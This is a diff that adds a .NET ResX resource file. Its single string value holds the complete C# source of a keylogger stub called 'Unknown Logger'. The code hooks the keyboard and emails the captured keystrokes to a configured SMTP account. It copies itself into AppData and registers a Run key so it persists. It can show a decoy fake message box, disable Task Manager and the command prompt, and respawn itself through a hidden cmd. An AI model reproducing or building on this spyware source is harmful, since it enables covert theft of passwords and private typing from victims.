@@ -1,0 +1,359 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="TB_Programcs.Text" xml:space="preserve">
+    <value>using System;
+using System.Text;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using UnknownLibrary.Keyhook;
+using UnknownLibrary.SMTP;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.IO;
+using UnknownLibrary.FakeMessageBox;
+
+namespace Unknown_Stub
+{
+    class Program
+    {
+        #region Variables 
+
+
+        internal static string EMailTo, EMailFrom, EMailPassword, SMTPServer, SMTPPort,
+        Subject = "Unknown Logger logs " + EMailCount, CustomStoreFolder = "\\WinActive\\", SiteVisitorURL, RegistryPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
+        internal static bool IsTicking;
+        internal static int EMailCount = 0;
+        static int SendInterval = 25000;
+        static System.Windows.Forms.Timer KeystrokeTimer = new System.Windows.Forms.Timer();
+        internal static LowLevelKeyboardListener Listener = new LowLevelKeyboardListener();
+        public static StringBuilder KeystrokeLogs = new StringBuilder();
+
+        static string FakeMessageBoxName, FakeMessageBoxText, FakeMessageBoxOption, FakeMessageBoxIcon, ApplicationName;
+        #endregion
+        #region TimerVoids
+        static void KeystrokeTimer_Tick(object sender, EventArgs e)
+        {
+            IsTicking = false;
+            KeystrokeTimer.Enabled = false;
+            LowLevelKeyhookListener();
+        }
+        #endregion
+        #region SMTP
+        internal static void EMailKeystrokes(string Keystrokes)
+        {
+            try
+            {
+                EMailCount++;
+                SMTP.SendMail(EMailFrom, EMailTo, Variables.SMTPServer, Variables.SMTPPort, EMailPassword, Subject, Keystrokes);
+            }
+            catch (Exception)
+            {
+                System.Threading.Thread.Sleep(25000);
+                EMailKeystrokes(Convert.ToString(KeystrokeLogs));
+            }
+        }
+
+        #endregion
+        #region DLLImports
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
+        public static extern short GetKeyState(int keyCode);
+
+
+        [DllImport("Kernel32")]
+        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);
+
+        static int SW_HIDE = 0;
+        static int SW_SHOW = 5;
+
+        #endregion
+        #region IfConsoleCloses
+        private delegate bool EventHandler(CtrlType sig);
+        static EventHandler _handler;
+        enum CtrlType
+        {
+            CTRL_C_EVENT = 0,
+            CTRL_BREAK_EVENT = 1,
+            CTRL_CLOSE_EVENT = 2,
+            CTRL_LOGOFF_EVENT = 5,
+            CTRL_SHUTDOWN_EVENT = 6
+        }
+
+        private static bool Handler(CtrlType sig)
+        {
+            Listener.UnHookKeyboard();
+            return false;
+        }
+        #endregion
+
+        static void Main(string[] args)
+        { 
+            #region IfConsoleCloses
+            _handler += new EventHandler(Handler);
+            SetConsoleCtrlHandler(_handler, true);
+            #endregion
+            #region Initialize
+            InitializeTimer();
+            #endregion
+            #region LogKeystrokes
+            KeystrokeTimer.Tick += KeystrokeTimer_Tick;
+            Listener.HookKeyboard();
+            LowLevelKeyhookListener();
+            Application.Run();
+            #endregion
+
+            #region FakeMessageBox
+            if (Variables.FakeMessageBox)
+            {
+                FakeMessageBoxCreator.createMessageBox(FakeMessageBoxOption, FakeMessageBoxText, FakeMessageBoxName, FakeMessageBoxIcon);
+            }
+            #endregion
+            #region MoveToAppDataAndAddToStartup
+            if (Variables.AddToStartup)
+            {
+                string exePath = Application.ExecutablePath;
+                string copyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                copyPath += CustomStoreFolder + Path.GetFileName(exePath);
+
+                if (!File.Exists(copyPath) &amp;&amp; !exePath.EndsWith("ve.exe"))
+                {
+                    File.Copy(exePath, copyPath);
+                    #region AddToStartup
+                    RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    add.SetValue(ApplicationName, "\"" + Application.ExecutablePath.ToString() + "\"");
+                }
+                #endregion
+            }
+            #endregion
+            #region SiteVisitor
+            if (Variables.SiteVisitor)
+            {
+                if (!Variables.SilentSiteVisitor)
+                {
+                    Process.Start(SiteVisitorURL);
+                }
+                else
+                {
+                    ProcessStartInfo OpenSite = new ProcessStartInfo()
+                    {
+                        UseShellExecute = false,
+                        FileName = SiteVisitorURL
+                    };
+                    Process Open = Process.Start(OpenSite);
+                }
+            }
+            #endregion
+            #region DisableTaskMger
+            if (Variables.DisableTaskManager)
+            {
+                DisableOrEnableApp("DisableTaskMgr", RegistryPath, false);
+            }
+            #endregion
+            #region DisableCMD
+            if (Variables.DisableCMD)
+            {
+                DisableOrEnableApp("DisableCMD", RegistryPath, false);
+            }
+            #endregion
+
+        }
+
+        #region LowLevelListenerVoid
+
+        private static void LowLevelKeyhookListener()
+        {
+            if (IsTicking)
+            {
+                Listener.OnKeyPressed += _listener_OnKeyPressed;
+            }
+            else
+            {
+                try
+                {
+                    EMailKeystrokes(Convert.ToString(KeystrokeLogs));
+                    KeystrokeLogs.Clear();
+                }
+                catch (Exception)
+                {
+                    System.Threading.Thread.Sleep(25000);
+                    EMailKeystrokes(Convert.ToString(KeystrokeLogs));
+                    KeystrokeLogs.Clear();
+                }
+            }
+            InitializeTimer();
+        }
+        #endregion
+        #region InitializeTimer
+        static void InitializeTimer()
+        {
+
+            KeystrokeTimer.Interval = SendInterval;
+            IsTicking = true;
+            KeystrokeTimer.Enabled = true;
+            KeystrokeTimer.Start();
+        }
+        #endregion
+        #region LowLevelListenerVoid
+        static void _listener_OnKeyPressed(object sender, KeyPressedArgs e)
+        {
+            bool CapsLock = (((ushort)GetKeyState(0x14)) &amp; 0xffff) != 0;
+            if (CapsLock)
+            {
+                KeystrokeLogs.Append(e.KeyPressed.ToString().ToUpper());
+            }
+            else
+            {
+                KeystrokeLogs.Append(e.KeyPressed.ToString().ToLower());
+            }
+
+        }
+        #endregion
+        #region DisableOrEnableApplication
+
+        static void DisableOrEnableApp(string Application, string RegistryPath, bool enable)
+        {
+            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
+                RegistryPath);
+            if (enable &amp;&amp; objRegistryKey.GetValue(Application) != null)
+                objRegistryKey.DeleteValue(Application);
+            else
+                objRegistryKey.SetValue(Application, "1");
+            objRegistryKey.Close();
+        }
+        #endregion
+        #region Respawner
+        private void StubForm_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            if (Variables.Respawner)
+            {
+                ProcessStartInfo Info = new ProcessStartInfo();
+                Info.Arguments = "/C ping 127.0.0.1 -n 2 &amp;&amp; \"" + Application.ExecutablePath + "\"";
+                Info.WindowStyle = ProcessWindowStyle.Hidden;
+                Info.CreateNoWindow = true;
+                Info.FileName = "cmd.exe";
+                Process.Start(Info);
+                Application.Exit();
+            }
+        }
+        #endregion
+    }
+}
+</value>
+  </data>
+</root>
